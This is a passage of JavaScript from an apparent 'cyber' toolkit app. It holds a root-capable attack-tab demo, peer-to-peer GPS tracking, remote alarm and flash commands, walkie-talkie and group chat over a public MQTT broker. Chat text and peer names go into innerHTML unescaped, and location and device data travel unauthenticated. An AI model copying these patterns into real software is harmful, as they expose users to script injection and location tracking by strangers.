                'airmon-ng': 'PHY\tInterface\tDriver\t\tChipset\nphy0\twlan0\t\tqcacld3\t\tQualcomm Atheros'
            };
            attackState.shellOutput = '$ ' + (asRoot ? 'su -c ' : '') + cmd + '\n';
            attackState.shellOutput += (demoOutputs[cmd] || 'Command executed (demo)\n') + '\n[exit: 0]';
        }
        refreshAttackTab();
    };

    // =========================================
    // GPS TRACKER MODULE — P2P Location Sharing
    // =========================================
    function generateUUID() {
        if (crypto.randomUUID) return crypto.randomUUID();
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
            const r = crypto.getRandomValues(new Uint8Array(1))[0] % 16;
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    }

    const trackerState = {
        myCode: localStorage.getItem('sgp_tracker_code') || null,
        myName: localStorage.getItem('sgp_tracker_name') || ('AGENTE-' + Math.random().toString(36).substr(2, 4).toUpperCase()),
        connected: false,
        mqttClient: null,
        trackedDevices: JSON.parse(localStorage.getItem('sgp_tracker_devices') || '{}'), // { code: { name, alias } }
        liveData: {},       // { code: { lat, lng, alt, speed, battery, lastSeen, name, deviceInfo } }
        watchId: null,
        publishInterval: null,
        myLat: null,
        myLng: null,
        markers: {},        // Leaflet markers on map
        alarmAudio: null,
        flashOn: false
    };

    // Init code on first run
    if (!trackerState.myCode) {
        trackerState.myCode = generateUUID();
        localStorage.setItem('sgp_tracker_code', trackerState.myCode);
    }
    localStorage.setItem('sgp_tracker_name', trackerState.myName);

    function renderTrackerPanel() {
        const connected = trackerState.connected;
        const devices = Object.entries(trackerState.trackedDevices);
        const shortCode = trackerState.myCode.substring(0, 8).toUpperCase();

        return `
            <div class="trk-module">
                <!-- Connection -->
                <div class="trk-status-bar">
                    <div class="walkie-status-dot ${connected ? 'online' : 'offline'}"></div>
                    <span class="walkie-status-text">${connected ? 'TRACKING' : 'DISCONNECTED'}</span>
                    <button class="walkie-connect-btn" onclick="window.SGP.trkToggleConnection()">
                        ${connected ? '⏏ STOP' : '⚡ START'}
                    </button>
                </div>

                <!-- My Code -->
                <div class="trk-mycode-section">
                    <div class="trk-label">YOUR TRACKING CODE</div>
                    <div class="trk-code-display" id="trk-my-code">${trackerState.myCode}</div>
                    <div class="trk-btn-row">
                        <button class="atk-btn primary" onclick="window.SGP.trkCopyCode()">📋 COPY</button>
                        <button class="atk-btn" onclick="window.SGP.trkRegenCode()">🔄 REGENERATE</button>
                    </div>
                    <div class="trk-hint">Share this code so others can track you</div>
                </div>

                <!-- My Name -->
                <div class="trk-section-sm">
                    <label class="trk-label">YOUR NAME</label>
                    <input type="text" id="trk-my-name" value="${trackerState.myName}" maxlength="20"
                        class="atk-input" onchange="window.SGP.trkSetName(this.value)">
                </div>

                <!-- Add Device -->
                <div class="trk-add-section">
                    <div class="trk-label">ADD DEVICE</div>
                    <div class="trk-add-row">
                        <input type="text" id="trk-add-code" placeholder="Paste UUID code..." class="atk-input mono">
                    </div>
                    <div class="trk-add-row">
                        <input type="text" id="trk-add-alias" placeholder="Alias (optional)" class="atk-input">
                        <button class="atk-btn primary" onclick="window.SGP.trkAddDevice()" style="min-width:60px">➕</button>
                    </div>
                </div>

                <!-- Tracked Devices -->
                <div class="trk-section">
                    <div class="walkie-section-title">📡 TRACKED DEVICES (${devices.length})</div>
                    <div class="trk-devices-list">
                        ${devices.length > 0 ? devices.map(([code, dev]) => {
                            const live = trackerState.liveData[code];
                            const isOnline = live && (Date.now() - live.lastSeen < 30000);
                            const battery = live ? live.battery : null;
                            const dist = live && trackerState.myLat ? getDistanceKm(trackerState.myLat, trackerState.myLng, live.lat, live.lng) : null;

                            return `
                                <div class="trk-device-card ${isOnline ? 'online' : 'offline'}">
                                    <div class="trk-device-header">
                                        <span class="walkie-user-dot" style="${isOnline ? '' : 'background:#ff2d2d;box-shadow:0 0 4px #ff2d2d;'}"></span>
                                        <span class="trk-device-name">${dev.alias || live?.name || code.substring(0, 8)}</span>
                                        <span class="trk-device-status">${isOnline ? '🟢' : '🔴'}</span>
                                    </div>
                                    ${live ? `
                                        <div class="trk-device-info">
                                            <div class="trk-info-row">
                                                <span>📍 Pos:</span>
                                                <span class="cyber-val">${live.lat.toFixed(5)}, ${live.lng.toFixed(5)}</span>
                                            </div>
                                            ${dist !== null ? `<div class="trk-info-row"><span>📏 Dist:</span><span class="cyber-val">${dist < 1 ? Math.round(dist * 1000) + ' m' : dist.toFixed(1) + ' km'}</span></div>` : ''}
                                            ${live.speed ? `<div class="trk-info-row"><span>🏃 Spd:</span><span class="cyber-val">${live.speed.toFixed(1)} km/h</span></div>` : ''}
                                            ${battery !== null ? `<div class="trk-info-row"><span>🔋 Bat:</span><span class="cyber-val" style="color:${battery > 20 ? '#00ff41' : '#ff2d2d'}">${battery}%</span></div>` : ''}
                                            <div class="trk-info-row"><span>⏱ Seen:</span><span class="cyber-val">${formatWalkieTime(live.lastSeen)}</span></div>
                                        </div>
                                        <div class="trk-device-controls">
                                            <button class="trk-ctrl-btn" onclick="window.SGP.trkFlyTo('${code}')" title="Center map">🎯</button>
                                            <button class="trk-ctrl-btn alarm" onclick="window.SGP.trkSendCommand('${code}','alarm')" title="Trigger alarm">🔔</button>
                                            <button class="trk-ctrl-btn flash" onclick="window.SGP.trkSendCommand('${code}','flash')" title="Toggle flash">🔦</button>
                                            <button class="trk-ctrl-btn danger" onclick="window.SGP.trkRemoveDevice('${code}')" title="Remove">🗑</button>
                                        </div>
                                    ` : `
                                        <div class="trk-device-info">
                                            <div class="trk-info-row"><span>Status:</span><span class="cyber-val" style="color:#ffaa00">Waiting for data...</span></div>
                                        </div>
                                        <div class="trk-device-controls">
                                            <button class="trk-ctrl-btn danger" onclick="window.SGP.trkRemoveDevice('${code}')" title="Remove">🗑</button>
                                        </div>
                                    `}
                                </div>
                            `;
                        }).join('') : '<div class="walkie-empty">No tracked devices.<br>Paste a code above to start.</div>'}
                    </div>
                </div>
            </div>
        `;
    }

    function initTrackerPanel() {
        // Nothing to init beyond render
    }

    function refreshTrackerPanel() {
        if (state.panelOpen !== 'tracker') return;
        const body = document.getElementById('panel-body');
        if (body) { body.innerHTML = renderTrackerPanel(); }
    }

    function getDistanceKm(lat1, lng1, lat2, lng2) {
        const R = 6371;
        const dLat = (lat2 - lat1) * Math.PI / 180;
        const dLng = (lng2 - lng1) * Math.PI / 180;
        const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                  Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                  Math.sin(dLng/2) * Math.sin(dLng/2);
        return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    }

    function saveTrackerDevices() {
        localStorage.setItem('sgp_tracker_devices', JSON.stringify(trackerState.trackedDevices));
    }

    // ---- Connection ----
    window.SGP.trkToggleConnection = function() {
        if (trackerState.connected) {
            trkDisconnect();
        } else {
            trkConnect();
        }
    };

    function trkConnect() {
        if (trackerState.mqttClient) {
            try { trackerState.mqttClient.end(true); } catch(e) {}
        }

        try {
            const clientId = 'sgp_trk_' + trackerState.myCode.substring(0, 8) + '_' + Date.now();
            const client = mqtt.connect('wss://broker.hivemq.com:8884/mqtt', {
                clientId, clean: true, connectTimeout: 10000, keepalive: 30, reconnectPeriod: 5000
            });

            client.on('connect', () => {
                trackerState.connected = true;
                trackerState.mqttClient = client;
                showToast('📡 TRACKER CONNECTED');

                // Subscribe to my own command channel
                client.subscribe('sgp/tracker/' + trackerState.myCode + '/cmd', { qos: 0 });

                // Subscribe to all tracked devices
                Object.keys(trackerState.trackedDevices).forEach(code => {
                    client.subscribe('sgp/tracker/' + code + '/loc', { qos: 0 });
                });

                // Start publishing my location
                trkStartLocationWatch();
                trackerState.publishInterval = setInterval(() => trkPublishLocation(), 10000);
                trkPublishLocation(); // Immediate first publish

                refreshTrackerPanel();
            });

            client.on('message', (topic, message) => {
                try {
                    const data = JSON.parse(message.toString());
                    trkHandleMessage(topic, data);
                } catch(e) {}
            });

            client.on('error', () => {});
            client.on('close', () => {
                trackerState.connected = false;
                refreshTrackerPanel();
            });

        } catch(e) {
            showToast('⚠ Connection error');
        }
    }

    function trkDisconnect() {
        if (trackerState.publishInterval) {
            clearInterval(trackerState.publishInterval);
            trackerState.publishInterval = null;
        }
        if (trackerState.watchId) {
            navigator.geolocation.clearWatch(trackerState.watchId);
            trackerState.watchId = null;
        }
        if (trackerState.mqttClient) {
            try { trackerState.mqttClient.end(true); } catch(e) {}
            trackerState.mqttClient = null;
        }
        trackerState.connected = false;
        showToast('📡 TRACKER DISCONNECTED');
        refreshTrackerPanel();
    }

    // ---- Location Watch ----
    function trkStartLocationWatch() {
        if (trackerState.watchId) return;
        if (!navigator.geolocation) return;

        trackerState.watchId = navigator.geolocation.watchPosition(
            (pos) => {
                trackerState.myLat = pos.coords.latitude;
                trackerState.myLng = pos.coords.longitude;
            },
            () => {},
            { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
        );
    }

    function trkPublishLocation() {
        const client = trackerState.mqttClient;
        if (!client || !trackerState.connected) return;

        // Use current GPS or map center as fallback
        const lat = trackerState.myLat || state.map?.getCenter()?.lat || 0;
        const lng = trackerState.myLng || state.map?.getCenter()?.lng || 0;

        // Get battery info
        let batteryLevel = null;
        if (navigator.getBattery) {
            navigator.getBattery().then(bat => {
                batteryLevel = Math.round(bat.level * 100);
                doPublish(lat, lng, batteryLevel);
            }).catch(() => doPublish(lat, lng, null));
        } else {
            doPublish(lat, lng, null);
        }

        function doPublish(lat, lng, battery) {
            const topic = 'sgp/tracker/' + trackerState.myCode + '/loc';
            const msg = JSON.stringify({
                name: trackerState.myName,
                lat, lng,
                alt: 0,
                speed: 0,
                battery: battery,
                ts: Date.now(),
                device: navigator.userAgent.substring(0, 60)
            });
            client.publish(topic, msg, { qos: 0 });
        }
    }

    // ---- Handle Messages ----
    function trkHandleMessage(topic, data) {
        // Location update from a tracked device
        if (topic.includes('/loc')) {
            const code = topic.split('/')[2]; // sgp/tracker/{code}/loc
            if (code === trackerState.myCode) return; // Skip self

            trackerState.liveData[code] = {
                lat: data.lat,
                lng: data.lng,
                alt: data.alt || 0,
                speed: data.speed || 0,
                battery: data.battery,
                name: data.name || code.substring(0, 8),
                lastSeen: Date.now(),
                deviceInfo: data.device || ''
            };

            // Update marker on map
            trkUpdateMapMarker(code);
            refreshTrackerPanel();
        }

        // Command for this device
        if (topic.includes('/cmd')) {
            if (data.target !== trackerState.myCode) return;

            switch(data.action) {
                case 'alarm':
                    trkPlayLocalAlarm();
                    showToast('🔔 REMOTE ALARM TRIGGERED!');
                    break;
                case 'flash':
                    trkToggleLocalFlash();
                    showToast('🔦 REMOTE FLASH');
                    break;
            }
        }
    }

    function trkUpdateMapMarker(code) {
        const live = trackerState.liveData[code];
        if (!live || !state.map) return;

        const dev = trackerState.trackedDevices[code];
        const name = dev?.alias || live.name || code.substring(0, 8);
        const bat = live.battery !== null ? ` 🔋${live.battery}%` : '';

        const iconHtml = `
            <div style="
                background: rgba(0,180,255,0.15);
                border: 2px solid #00b4ff;
                border-radius: 50%;
                width: 32px; height: 32px;
                display: flex; align-items: center; justify-content: center;
                box-shadow: 0 0 12px rgba(0,180,255,0.5);
                animation: trkPulse 2s ease infinite;
            ">
                <div style="background:#00b4ff;width:10px;height:10px;border-radius:50%;"></div>
            </div>
        `;

        const icon = L.divIcon({
            html: iconHtml,
            className: 'trk-map-icon',
            iconSize: [32, 32],
            iconAnchor: [16, 16]
        });

        if (trackerState.markers[code]) {
            trackerState.markers[code].setLatLng([live.lat, live.lng]);
            trackerState.markers[code].setIcon(icon);
        } else {
            trackerState.markers[code] = L.marker([live.lat, live.lng], { icon })
                .addTo(state.map);
        }

        trackerState.markers[code].bindPopup(`
            <div style="font-family:monospace;font-size:12px;min-width:150px">
                <b>${name}</b>${bat}<br>
                📍 ${live.lat.toFixed(5)}, ${live.lng.toFixed(5)}<br>
                ⏱ ${new Date(live.lastSeen).toLocaleTimeString()}
            </div>
        `);
    }

    // ---- Controls ----
    window.SGP.trkCopyCode = function() {
        navigator.clipboard.writeText(trackerState.myCode).then(() => {
            showToast('📋 Code copied: ' + trackerState.myCode.substring(0, 8) + '...');
        }).catch(() => {
            // Fallback
            const el = document.createElement('textarea');
            el.value = trackerState.myCode;
            document.body.appendChild(el);
            el.select();
            document.execCommand('copy');
            document.body.removeChild(el);
            showToast('📋 Code copied');
        });
    };

    window.SGP.trkRegenCode = function() {
        if (trackerState.connected) {
            showToast('⚠ Disconnect before regenerating');
            return;
        }
        trackerState.myCode = generateUUID();
        localStorage.setItem('sgp_tracker_code', trackerState.myCode);
        showToast('🔄 New code generated');
        refreshTrackerPanel();
    };

    window.SGP.trkSetName = function(name) {
        name = name.trim().substring(0, 20);
        if (!name) name = 'AGENTE-' + Math.random().toString(36).substr(2, 4).toUpperCase();
        trackerState.myName = name;
        localStorage.setItem('sgp_tracker_name', name);
    };

    window.SGP.trkAddDevice = function() {
        const code = document.getElementById('trk-add-code')?.value?.trim();
        const alias = document.getElementById('trk-add-alias')?.value?.trim() || '';

        if (!code || code.length < 8) {
            showToast('⚠ Invalid code');
            return;
        }
        if (code === trackerState.myCode) {
            showToast('⚠ Cannot track yourself');
            return;
        }
        if (trackerState.trackedDevices[code]) {
            showToast('⚠ Device already added');
            return;
        }

        trackerState.trackedDevices[code] = { alias, addedAt: Date.now() };
        saveTrackerDevices();

        // Subscribe if connected
        if (trackerState.mqttClient && trackerState.connected) {
            trackerState.mqttClient.subscribe('sgp/tracker/' + code + '/loc', { qos: 0 });
        }

        showToast('✅ Device added: ' + (alias || code.substring(0, 8)));
        refreshTrackerPanel();
    };

    window.SGP.trkRemoveDevice = function(code) {
        // Unsubscribe
        if (trackerState.mqttClient && trackerState.connected) {
            trackerState.mqttClient.unsubscribe('sgp/tracker/' + code + '/loc');
        }

        // Remove marker
        if (trackerState.markers[code]) {
            state.map.removeLayer(trackerState.markers[code]);
            delete trackerState.markers[code];
        }

        delete trackerState.trackedDevices[code];
        delete trackerState.liveData[code];
        saveTrackerDevices();

        showToast('🗑 Device removed');
        refreshTrackerPanel();
    };

    window.SGP.trkFlyTo = function(code) {
        const live = trackerState.liveData[code];
        if (live && state.map) {
            state.map.flyTo([live.lat, live.lng], 16, { duration: 1 });
            closePanel();
        } else {
            showToast('⚠ No location data');
        }
    };

    window.SGP.trkSendCommand = function(code, action) {
        const client = trackerState.mqttClient;
        if (!client || !trackerState.connected) {
            showToast('⚠ Connect first');
            return;
        }

        const topic = 'sgp/tracker/' + code + '/cmd';
        const msg = JSON.stringify({
            from: trackerState.myCode,
            target: code,
            action: action,
            ts: Date.now()
        });
        client.publish(topic, msg, { qos: 0 });
        showToast(action === 'alarm' ? '🔔 Alarm sent' : '🔦 Flash sent');
    };

    // ---- Local Alarm & Flash ----
    function trkPlayLocalAlarm() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            let t = ctx.currentTime;

            for (let i = 0; i < 20; i++) {
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.frequency.value = i % 2 === 0 ? 880 : 1200;
                osc.type = 'square';
                gain.gain.value = 0.5;
                osc.start(t);
                osc.stop(t + 0.2);
                t += 0.3;
            }

            setTimeout(() => ctx.close(), 7000);
        } catch(e) {}

        // Also try vibration
        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200, 100, 200, 100, 500, 200, 200, 100, 200, 100, 200]);
        }
    }

    function trkToggleLocalFlash() {
        // Try using camera flash via native plugin
        const plugin = getCyberPlugin();
        if (plugin) {
            try {
                if (trackerState.flashOn) {
                    plugin.executeCommand({ command: 'echo 0 > /sys/class/leds/flashlight/brightness', root: true });
                } else {
                    plugin.executeCommand({ command: 'echo 255 > /sys/class/leds/flashlight/brightness', root: true });
                }
            } catch(e) {}
        }

        // Also try torch via camera API
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                .then(stream => {
                    const track = stream.getVideoTracks()[0];
                    if (track.getCapabilities && track.getCapabilities().torch) {
                        trackerState.flashOn = !trackerState.flashOn;
                        track.applyConstraints({ advanced: [{ torch: trackerState.flashOn }] })
                            .catch(() => {});
                        if (!trackerState.flashOn) {
                            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 100);
                        }
                    }
                }).catch(() => {});
        }
    }

    // =========================================
    // WALKIE-TALKIE MODULE — MQTT P2P COMMS
    // =========================================
    const walkieState = {
        connected: false,
        channel: parseInt(localStorage.getItem('sgp_walkie_ch') || '1'),
        callsign: localStorage.getItem('sgp_walkie_cs') || ('OP-' + Math.random().toString(36).substr(2, 4).toUpperCase()),
        mqttClient: null,
        recording: false,
        mediaRecorder: null,
        audioChunks: [],
        audioStream: null,
        users: {},
        log: [],
        pttActive: false,
        playQueue: [],
        playing: false,
        volume: parseFloat(localStorage.getItem('sgp_walkie_vol') || '0.8'),
        presenceInterval: null,
        squelch: true
    };

    localStorage.setItem('sgp_walkie_cs', walkieState.callsign);

    // ---- Chat Module State ----
    const chatState = {
        activeTab: 'walkie',
        groups: JSON.parse(localStorage.getItem('sgp_chat_groups') || '{}'),
        messages: JSON.parse(localStorage.getItem('sgp_chat_msgs') || '{}'),
        activeGroup: localStorage.getItem('sgp_chat_active') || null,
        myId: localStorage.getItem('sgp_chat_id') || null,
        myName: localStorage.getItem('sgp_chat_name') || ('Agent-' + Math.random().toString(36).substr(2, 4).toUpperCase()),
        mqttClient: null,
        connected: false,
        groupUsers: {},
        groupCallActive: false
    };

    if (!chatState.myId) {
        chatState.myId = generateUUID();
        localStorage.setItem('sgp_chat_id', chatState.myId);
    }
    localStorage.setItem('sgp_chat_name', chatState.myName);

    function saveChatGroups() { sgpSave('chat_groups', chatState.groups); }
    function saveChatMessages() { sgpSave('chat_msgs', chatState.messages); }

    function renderCommsPanel() {
        return `
            <div class="comms-tabs">
                <button class="comms-tab ${chatState.activeTab === 'walkie' ? 'active' : ''}" onclick="window.SGP.commsTab('walkie')">🎙 WALKIE</button>
                <button class="comms-tab ${chatState.activeTab === 'chat' ? 'active' : ''}" onclick="window.SGP.commsTab('chat')">💬 CHAT</button>
            </div>
            <div id="comms-content">
                ${chatState.activeTab === 'walkie' ? renderWalkieContent() : renderChatContent()}
            </div>
        `;
    }

    window.SGP.commsTab = function(tab) {
        chatState.activeTab = tab;
        const body = document.getElementById('panel-body');
        if (body) { body.innerHTML = renderCommsPanel(); initCommsPanel(); }
    };

    function renderWalkieContent() {
        const ch = String(walkieState.channel).padStart(2, '0');
        const connected = walkieState.connected;
        const users = Object.entries(walkieState.users).filter(([_, u]) => u.channel === walkieState.channel);

        return `
            <div class="walkie-module">
                <div class="walkie-status-bar">
                    <div class="walkie-status-dot ${connected ? 'online' : 'offline'}"></div>
                    <span class="walkie-status-text">${connected ? 'CONNECTED' : 'DISCONNECTED'}</span>
                    <button class="walkie-connect-btn" onclick="window.SGP.walkieToggleConnection()">
                        ${connected ? '⏏ DISCONNECT' : '⚡ CONNECT'}
                    </button>
                </div>
                <div class="walkie-callsign-section">
                    <label>CALLSIGN</label>
                    <div class="walkie-callsign-row">
                        <input type="text" id="walkie-callsign" value="${walkieState.callsign}" maxlength="12"
                            class="walkie-callsign-input" onchange="window.SGP.walkieSetCallsign(this.value)">
                    </div>
                </div>
                <div class="walkie-channel-section">
                    <button class="walkie-ch-btn" onclick="window.SGP.walkieChangeChannel(-1)">◀</button>
                    <div class="walkie-channel-display">
                        <div class="walkie-ch-label">CHANNEL</div>
                        <div class="walkie-ch-number">${ch}</div>
                    </div>
                    <button class="walkie-ch-btn" onclick="window.SGP.walkieChangeChannel(1)">▶</button>
                </div>
                <div class="walkie-ptt-section">
                    <button class="walkie-ptt-btn ${walkieState.pttActive ? 'active' : ''} ${!connected ? 'disabled' : ''}"
                        id="walkie-ptt-btn" ${!connected ? 'disabled' : ''}>
                        <div class="walkie-ptt-icon">${walkieState.pttActive ? '🔴' : '🎙️'}</div>
                        <div class="walkie-ptt-text">${walkieState.pttActive ? 'TRANSMITTING...' : 'PUSH TO TALK'}</div>
                    </button>
                    <div class="walkie-ptt-hint">Hold to transmit</div>
                </div>
                <div class="walkie-volume-section">
                    <span class="walkie-vol-icon">🔊</span>
                    <input type="range" id="walkie-volume" min="0" max="1" step="0.1" value="${walkieState.volume}"
                        class="walkie-volume-slider" oninput="window.SGP.walkieSetVolume(this.value)">
                    <span class="walkie-vol-val">${Math.round(walkieState.volume * 100)}%</span>
                </div>
                <div class="walkie-section">
                    <div class="walkie-section-title">👥 ON CHANNEL ${ch} (${users.length})</div>
                    <div class="walkie-users-list">
                        ${users.length > 0 ? users.map(([cs, u]) => `
                            <div class="walkie-user-item ${cs === walkieState.callsign ? 'me' : ''}">
                                <span class="walkie-user-dot"></span>
                                <span class="walkie-user-name">${cs}${cs === walkieState.callsign ? ' (YOU)' : ''}</span>
                                <span class="walkie-user-time">${formatWalkieTime(u.lastSeen)}</span>
                            </div>
                        `).join('') : '<div class="walkie-empty">No users on this channel</div>'}
                    </div>
                </div>
                <div class="walkie-section">
                    <div class="walkie-section-title">📋 ACTIVITY</div>
                    <div class="walkie-log" id="walkie-log">
                        ${walkieState.log.length > 0 ? walkieState.log.slice(-15).reverse().map(e => `
                            <div class="walkie-log-entry ${e.type}">
                                <span class="walkie-log-time">${e.time}</span>
                                <span class="walkie-log-msg">${e.msg}</span>
                            </div>
                        `).join('') : '<div class="walkie-empty">No activity</div>'}
                    </div>
                </div>
            </div>
        `;
    }

    function renderChatContent() {
        const groups = Object.entries(chatState.groups);
        const activeGroup = chatState.activeGroup;
        const msgs = activeGroup ? (chatState.messages[activeGroup] || []) : [];
        const groupInfo = activeGroup ? chatState.groups[activeGroup] : null;
        const groupUsers = activeGroup ? (chatState.groupUsers[activeGroup] || {}) : {};
        const onlineCount = Object.values(groupUsers).filter(u => Date.now() - u.lastSeen < 30000).length;

        return `
            <div class="chat-module">
                <!-- Connection -->
                <div class="trk-status-bar">
                    <div class="walkie-status-dot ${chatState.connected ? 'online' : 'offline'}"></div>
                    <span class="walkie-status-text">${chatState.connected ? 'ONLINE' : 'OFFLINE'}</span>
                    <button class="walkie-connect-btn" onclick="window.SGP.chatToggleConnection()">
                        ${chatState.connected ? '⏏ DISCONNECT' : '⚡ CONNECT'}
                    </button>
                </div>

                <!-- My Name -->
                <div class="trk-section-sm">
                    <label class="trk-label">YOUR NAME</label>
                    <input type="text" id="chat-my-name" value="${chatState.myName}" maxlength="20"
                        class="atk-input" onchange="window.SGP.chatSetName(this.value)">
                </div>

                <!-- Create / Join Group -->
                <div class="trk-add-section">
                    <div class="trk-label">CREATE / JOIN GROUP</div>
                    <div class="trk-add-row">
                        <button class="atk-btn primary" onclick="window.SGP.chatCreateGroup()" style="flex:1">➕ NEW GROUP</button>
                    </div>
                    <div class="trk-add-row">
                        <input type="text" id="chat-join-code" placeholder="Paste group code..." class="atk-input mono">
                        <button class="atk-btn primary" onclick="window.SGP.chatJoinGroup()" style="min-width:50px">JOIN</button>
                    </div>
                </div>

                <!-- Group List -->
                <div class="chat-groups-section">
                    <div class="walkie-section-title">💬 GROUPS (${groups.length})</div>
                    <div class="chat-groups-list">
                        ${groups.length > 0 ? groups.map(([code, g]) => {
                            const unread = (chatState.messages[code] || []).filter(m => m.from !== chatState.myId && !m.read).length;
                            const isActive = code === activeGroup;
                            return `
                                <div class="chat-group-item ${isActive ? 'active' : ''}" onclick="window.SGP.chatSelectGroup('${code}')">
                                    <div class="chat-group-icon">💬</div>
                                    <div class="chat-group-info">
                                        <div class="chat-group-name">${g.name}</div>
                                        <div class="chat-group-code">${code.substring(0, 8)}...</div>
                                    </div>
                                    ${unread > 0 ? `<span class="chat-unread">${unread}</span>` : ''}
                                    <button class="trk-ctrl-btn danger" onclick="event.stopPropagation();window.SGP.chatLeaveGroup('${code}')" style="flex:0;padding:4px 6px" title="Leave">✕</button>
                                </div>
                            `;
                        }).join('') : '<div class="walkie-empty">No groups yet. Create or join one above.</div>'}
                    </div>
                </div>

                ${activeGroup && groupInfo ? `
                    <!-- Active Chat -->
                    <div class="chat-active-section">
                        <div class="chat-header">
                            <span class="chat-header-name">${groupInfo.name}</span>
                            <span class="chat-header-users">👥 ${onlineCount} online</span>
                            <button class="trk-ctrl-btn ${chatState.groupCallActive ? 'alarm' : ''}" onclick="window.SGP.chatToggleCall()" title="Group call" style="flex:0;padding:4px 8px">
                                ${chatState.groupCallActive ? '📞 END' : '📞'}
                            </button>
                            <button class="trk-ctrl-btn" onclick="window.SGP.chatCopyGroupCode()" title="Copy code" style="flex:0;padding:4px 8px">📋</button>
                        </div>

                        <!-- Messages -->
                        <div class="chat-messages" id="chat-messages">
                            ${msgs.length > 0 ? msgs.slice(-50).map(m => `
                                <div class="chat-msg ${m.from === chatState.myId ? 'me' : 'other'}">
                                    ${m.from !== chatState.myId ? `<div class="chat-msg-name">${m.fromName || 'Unknown'}</div>` : ''}
                                    <div class="chat-msg-text">${m.text}</div>
                                    <div class="chat-msg-time">${new Date(m.ts).toLocaleTimeString()}</div>
                                </div>
                            `).join('') : '<div class="walkie-empty" style="padding:20px">No messages yet. Say hello!</div>'}
                        </div>

                        <!-- Input -->
                        <div class="chat-input-section">
                            <input type="text" id="chat-msg-input" placeholder="Type a message..." class="chat-input"
                                onkeydown="if(event.key==='Enter')window.SGP.chatSendMsg()">
                            <button class="chat-send-btn" onclick="window.SGP.chatSendMsg()">➤</button>
                        </div>
                    </div>
                ` : ''}
            </div>
        `;
    }

    function initCommsPanel() {
        if (chatState.activeTab === 'walkie') {
            // Setup PTT button events (touch + mouse)
            const pttBtn = document.getElementById('walkie-ptt-btn');
            if (!pttBtn) return;
            pttBtn.addEventListener('mousedown', (e) => { e.preventDefault(); walkieStartPTT(); });
            pttBtn.addEventListener('mouseup', () => walkieStopPTT());
            pttBtn.addEventListener('mouseleave', () => { if (walkieState.pttActive) walkieStopPTT(); });
            pttBtn.addEventListener('touchstart', (e) => { e.preventDefault(); walkieStartPTT(); });
            pttBtn.addEventListener('touchend', (e) => { e.preventDefault(); walkieStopPTT(); });
            pttBtn.addEventListener('touchcancel', () => { if (walkieState.pttActive) walkieStopPTT(); });
        } else {
            // Scroll chat to bottom
            const chatEl = document.getElementById('chat-messages');
            if (chatEl) chatEl.scrollTop = chatEl.scrollHeight;
        }
    }

    // ---- Chat Connection (separate MQTT) ----
    function chatConnect() {
        if (chatState.mqttClient) try { chatState.mqttClient.end(true); } catch(e) {}
        try {
            const clientId = 'sgp_chat_' + chatState.myId.substring(0, 8) + '_' + Date.now();
            const client = mqtt.connect('wss://broker.hivemq.com:8884/mqtt', {
                clientId, clean: true, connectTimeout: 10000, keepalive: 30, reconnectPeriod: 5000
            });
            client.on('connect', () => {
                chatState.connected = true;
                chatState.mqttClient = client;
                showToast('💬 Chat connected');
                // Subscribe to all group topics
                Object.keys(chatState.groups).forEach(code => {
                    client.subscribe('sgp/chat/' + code + '/msg', { qos: 0 });
                    client.subscribe('sgp/chat/' + code + '/presence', { qos: 0 });
                    client.subscribe('sgp/chat/' + code + '/call', { qos: 0 });
                    // Announce presence
                    client.publish('sgp/chat/' + code + '/presence', JSON.stringify({
                        id: chatState.myId, name: chatState.myName, action: 'join', ts: Date.now()
                    }), { qos: 0 });
                });
                refreshCommsPanel();
            });
            client.on('message', (topic, message) => {
                try { chatHandleMessage(topic, JSON.parse(message.toString())); } catch(e) {}
            });
            client.on('error', () => {});
            client.on('close', () => { chatState.connected = false; refreshCommsPanel(); });
        } catch(e) { showToast('⚠ Connection error'); }
    }

    function chatDisconnect() {
        if (chatState.mqttClient) {
            // Leave presence in all groups
            Object.keys(chatState.groups).forEach(code => {
                try {
                    chatState.mqttClient.publish('sgp/chat/' + code + '/presence', JSON.stringify({
                        id: chatState.myId, name: chatState.myName, action: 'leave', ts: Date.now()
                    }), { qos: 0 });
                } catch(e) {}
            });
            try { chatState.mqttClient.end(true); } catch(e) {}
        }
        chatState.mqttClient = null;
        chatState.connected = false;
        showToast('💬 Chat disconnected');
        refreshCommsPanel();
    }

    function chatHandleMessage(topic, data) {
        const parts = topic.split('/'); // sgp/chat/{code}/{type}
        const code = parts[2];
        const type = parts[3];

        if (type === 'msg' && data.from !== chatState.myId) {
            if (!chatState.messages[code]) chatState.messages[code] = [];
            chatState.messages[code].push({
                from: data.from, fromName: data.fromName, text: data.text, ts: data.ts,
                read: chatState.activeGroup === code
            });
            saveChatMessages();
            refreshCommsPanel();
            // Notification sound
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain); gain.connect(ctx.destination);
                osc.frequency.value = 800; osc.type = 'sine'; gain.gain.value = 0.2;
                osc.start(); osc.stop(ctx.currentTime + 0.1);
                setTimeout(() => ctx.close(), 500);
            } catch(e) {}
        }

        if (type === 'presence') {
            if (!chatState.groupUsers[code]) chatState.groupUsers[code] = {};
            if (data.action === 'leave') {
                delete chatState.groupUsers[code][data.id];
            } else {
                chatState.groupUsers[code][data.id] = { name: data.name, lastSeen: Date.now() };
            }
            refreshCommsPanel();
        }

        if (type === 'call') {
            // Received group call audio (same as walkie PTT)
            if (data.from !== chatState.myId && data.audio) {
                try {
                    const audio = new Audio('data:audio/webm;base64,' + data.audio);
                    audio.volume = walkieState.volume;
                    audio.play().catch(() => {});
                } catch(e) {}
            }
        }
    }

    function refreshCommsPanel() {
        if (state.panelOpen !== 'comms') return;
        const body = document.getElementById('panel-body');
        if (body) { body.innerHTML = renderCommsPanel(); initCommsPanel(); }
    }

